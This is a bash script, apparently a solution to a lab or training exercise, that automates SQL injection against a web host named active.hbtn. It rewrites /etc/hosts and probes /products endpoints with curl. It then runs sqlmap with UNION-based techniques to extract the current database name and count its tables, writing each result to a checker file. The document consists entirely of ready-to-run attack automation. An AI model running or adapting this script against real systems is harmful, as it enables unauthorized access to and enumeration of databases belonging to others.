#!/usr/bin/env bash
set -euo pipefail

IP="10.42.145.105"         # 🔁 IP dəyişsə, bunu yenilə
HOST="active.hbtn"

# hosts yenilə
sudo sed -i '/active\.hbtn/d' /etc/hosts
echo "$IP $HOST" | sudo tee -a /etc/hosts >/dev/null

# checker üçün path
echo "/products" > 2-injectable.txt

# yoxlanacaq URL-lər
declare -a cands=(
  "http://$HOST/products/1*"
  "http://$HOST/products?id=1"
  "http://$IP/products/1*|--host=$HOST"
  "http://$IP/products?id=1|--host=$HOST"
)

rm -f 3-database.txt 4-tables.txt tables.out

for entry in "${cands[@]}"; do
  url="${entry%%|*}"
  extra="${entry#*|}"; [[ "$url" == "$extra" ]] && extra=""
  check="${url%\*}"

  # endpoint mövcuddurmu?
  if [[ -n "$extra" ]]; then
    code=$(curl -s -o /dev/null -w '%{http_code}' -H "Host: $HOST" "$check")
  else
    code=$(curl -s -o /dev/null -w '%{http_code}' "$check")
  fi
  [[ "$code" -ge 200 && "$code" -lt 400 ]] || continue
  echo "[*] Testing $url (HTTP $code)"

  # DB adı (sürətli: UNION-only, qısa timeoutlar)
  db=$(sqlmap -u "$url" $extra --current-db --batch --technique=U \
        --threads=5 --timeout=8 --retries=0 --random-agent --flush-session -v 0 2>/dev/null \
      | sed -n "s/.*current database: '\([^']\+\)'.*/\1/p" | head -n1)

  [[ -z "${db:-}" ]] && continue
  printf '%s\n' "$db" > 3-database.txt
  echo "[+] DB: $db"

  # cədvəl sayı
  sqlmap -u "$url" $extra -D "$db" --tables \
        --batch --technique=U --threads=5 --timeout=8 --retries=0 \
        --random-agent -v 0 > tables.out

  awk '/\|/ && !/Name/ {c++} END{print c+0}' tables.out > 4-tables.txt
  echo "[+] Tables: $(cat 4-tables.txt)"
  break
done

echo "---- RESULTS ----"
[[ -f 3-database.txt ]] && { echo -n "DB: "; cat 3-database.txt; } || echo "DB: (not found)"
[[ -f 4-tables.txt ]] && { echo -n "Tables: "; cat 4-tables.txt; } || echo "Tables: (not found)"
